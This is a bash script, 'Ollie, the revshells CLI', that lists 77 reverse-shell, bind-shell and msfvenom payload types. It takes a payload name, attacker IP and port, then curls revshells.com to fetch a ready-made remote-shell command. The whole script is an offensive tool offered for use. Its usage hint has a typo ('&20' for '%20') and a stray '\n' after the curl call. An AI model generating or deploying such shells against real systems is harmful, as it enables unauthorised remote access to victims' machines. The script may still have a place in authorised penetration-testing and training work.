#!/bin/bash

echo "Welcome, to Ollie, the revshells CLI!"
echo "Twitter: @0dayCTF, @VainXploits & @sootierprivate"

#Types of Payloads

echo "--------------------------------------"
echo "IMPORTANT NOTE: This program is case sensitive, please enter the exact text you see, in the available payloads section within the PAYLOAD field! please add a '%20' if there are spaces between words in the payload. Example (PAYLOAD: Bash&20-i)"

#Payloads Available
echo "--------------------------------------"
echo "Reverse shells(All OS)"
echo "--------------------------------------"

bash="1: Bash -i"
echo $bash
bash196="2: Bash 196"
echo $bash196
bash_read_line="3: Bash read line"
echo $bash_read_line
bash5="4: Bash 5"
echo $bash5
bash_udp="5: Bash udp"
echo $bash_udp
nc_mkfifo="6: nc mkfifo"
echo $nc_mkfifo
nc_e="7: nc -e"
echo $nc_e
nc_c="8: nc -c"
echo $nc_c
ncat_e="9: ncat -e"
echo $ncat_e
ncat_udp="10: ncat udp"
echo $ncat_udp
rustcat="11: rustcat"
echo $rustcat
C="12: C"
echo $C
C_windows="13: C Windows"
echo $C_windows
C_sharp="14: C#"
echo $C_sharp
Haskell_1="15: Haskell#1"
echo $Haskell_1
perl="16: Perl"
echo $perl
perl_no_sh="17: Perl no sh"
echo $perl_no_sh
php_emoji="18: PHP Emoji"
echo $php_emoji
php_pentestmonkey="19: PHP Pentestmonkey"
echo $php_pentestmonkey
php_ivan_sincek="20: PHP Ivan Sincek"
echo $php_ivan_sincek
php_cmd="21: PHP cmd"
echo $php_cmd
php_exec="22: PHP exec"
echo $php_exec
php_shell_exec="23: PHP shell_exec"
echo $php_shell_exec
php_system="24: PHP system"
echo $php_system
php_passthrough="25: PHP passthru"
echo $php_passthrough
php_backquote="26: PHP Backquote"
echo $php_backquote
php_popen="27: PHP popen"
echo $php_popen
php_proc_open="28: PHP proc_open"
echo $php_proc_open
windows_conpty="29: Windows ConPty"
echo $windows_conpty
powershell1="30: Powershell #1"
echo $powershell1
powershell2="31: Powershell #2"
echo $powershell2
powershell3="32: Powershell #3"
echo $powershell3
powershell4tls="33: Powershell #4 (TLS)"
echo $powershell4tls
powershell3base64="34: Powershell #3 (Base64)"
echo $powershell3base64
python1="35: Python #1"
echo $python1
python2="36: Python #2"
echo $python2
python3_1="37: Python3 #1"
echo $python3_1
python3_2="38: Python3 #2"
echo $python3_2
python3_shortest="39: Python3 shortest"
echo $python3_shortest
ruby1="40: Ruby #1"
echo $ruby1
ruby_no_sh="41: Ruby no sh"
echo $ruby_no_sh
socat1="42: Socat #1"
echo $socat1
socat_2tty="43: Socat #2 (TTY)"
echo $socat_2tty
nodejs="44: node.js"
echo $nodejs
nodejs2="45: node.js #2"
echo $nodejs2
java1="46: Java #1"
echo $java1
java2="47: Java #2"
echo $java2
java3="48: Java #3"
echo $java3
javascript="49: Javascript"
echo $javascript
groovy="50: Groovy"
echo $groovy
telnet="51: telnet"
echo $telnet
zsh="52: zsh"
echo $zsh
lua1="53: Lua #1"
echo $lua1
lua2="54: Lua #2"
echo $lua2
golang="55: Golang"
echo $golang
awk="56: Awk"
echo $awk
dart="57: Dart"
echo $dart

echo "--------------------------------------"
echo "Bind shells"
echo "--------------------------------------"

python3_bind="58: Python3 Bind"
echo $python3_bind
php_bind="59: PHP Bind"
echo $php_bind

echo "--------------------------------------"
echo "MSFVenom Shells"
echo "--------------------------------------"

windows_meterpreter_staged="60: Windows Meterpreter Staged Reverse TCP (x64)"
echo $windows_meterpreter_staged
windows_meterpreter_stageless="61: Windows Meterpreter Stageless Reverse TCP (x64)"
echo $windows_meterpreter_stageless
windows_staged_reverse="62: Windows Staged Reverse TCP (x64)"
echo $windows_staged_reverse
windows_stageless_reverse="63: Windows Stageless Reverse TCP (x64)"
echo $windows_stageless_reverse
linux_meterpreter_staged_reverse="64: Linux Meterpreter Staged Reverse TCP (x64)"
echo $linux_meterpreter_staged_reverse
linux_stageless_reverse="65: Linux Stageless Reverse TCP (x64)"
echo $linux_stageless_reverse
windows_bind_tcp_shellcode_bof="66: Windows Bind TCP ShellCode - BOF"
echo $windows_bind_tcp_shellcode_bof
macos_meterpreter_reverse_staged="67: macOS Meterpreter Staged Reverse TCP (x64)"
echo $macos_meterpreter_reverse_staged
macos_meterpreter_reverse_stageless="68: macOS Meterpreter Stageless Reverse TCP (x64)"
echo $macos_meterpreter_reverse_stageless
macos_stageless_reverse="69: macOS Stageless Reverse TCP (x64)"
echo $macos_stageless_reverse
php_meterpreter_stageless_reverse="70: PHP Reverse Stageless Reverse TCP"
echo $php_meterpreter_stageless_reverse
php_reverse_echo="71: PHP Reverse PHP"
echo $php_reverse_echo
jsp_stageless_reverse="72: JSP Stageless Reverse TCP"
echo $jsp_stageless_reverse
war_stageless_reverse="73: WAR Stageless Reverse TCP"
echo $war_stageless_reverse
android_meterpreter_reverse="74: Android Meterpreter Reverse TCP"
echo $android_meterpreter_reverse
android_meterpreter_embed_reverse="75: Android Meterpreter Embed Reverse TCP"
echo $android_meterpreter_embed_reverse
python_stageless_reverse="76: Python Stageless Reverse TCP"
echo $python_stageless_reverse
bash_stageless_reverse="77: Bash Stageless Reverse TCP"
echo $bash_stageless_reverse
#echo "--------------------------------------"

#User input for Payload, IP & PORT
echo "--------------------------------------"
read -p "PAYLOAD: " PAYLOAD
read -p "IP: " IP
read -p "PORT: " PORT

curl "https://www.revshells.com/`echo $PAYLOAD |sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh"\n
